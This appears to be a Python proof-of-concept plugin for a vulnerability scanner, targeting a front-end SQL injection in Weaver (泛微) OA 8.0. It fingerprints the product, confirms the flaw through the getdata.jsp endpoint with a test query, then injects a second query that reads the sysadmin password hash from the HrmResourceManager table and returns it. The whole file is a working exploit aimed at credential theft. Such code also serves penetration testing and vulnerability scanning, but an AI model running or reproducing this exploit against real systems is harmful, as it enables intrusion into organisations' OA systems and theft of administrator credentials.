# -*- coding:utf-8 -*-
# 泛微OA8.0 SQL注入

from .. import requestUtil

vul_path_8 = "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201234%20as%20id"
pwd_path = "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"

def wui_sql(url):
    resp = requestUtil.get(url+vul_path_8)
    if "1234" in resp.text:
        resp = requestUtil.get(url+pwd_path)
        return ["泛微OA8.0 前台SQL注入", "用户名: %s<br>MD5密码: %s"%("sysadmin", resp.text)]
    else:
        return []


def fingerprint(service):
    try:
        if not service.url == "" and "/help/sys/help.html" in requestUtil.get(service.url).text:
            return True
    except:
        return False

def poc(service):
    try:
        return wui_sql(service.url)
    except:
        return []